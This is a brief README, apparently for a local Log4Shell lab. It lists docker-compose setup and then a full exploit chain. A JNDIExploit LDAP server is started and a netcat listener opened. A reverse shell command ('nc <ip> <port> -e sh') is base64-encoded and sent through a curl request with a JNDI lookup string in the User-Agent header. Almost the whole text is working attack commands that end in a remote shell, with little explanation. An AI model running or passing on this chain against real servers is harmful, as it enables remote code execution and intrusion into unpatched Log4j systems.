# Log4Shell



#### Steps to run


## Build and Run

```
docker-compose up --build
```


## Setup ldap server
-   Github [repo](https://github.com/feihong-cs/JNDIExploit)
```
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <ip> -p <port>
```


## Listener
```
nc -vlp <port>
```


## convert to base64
```
echo -n 'nc <ip> <port> -e sh' | base64
```


## payload
```
curl http://localhost:8080/hello/user -H 'User-Agent: ${jndi:ldap://<private_ip>:1389/Basic/Command/Base64/<netcat base64 payload>}'
```

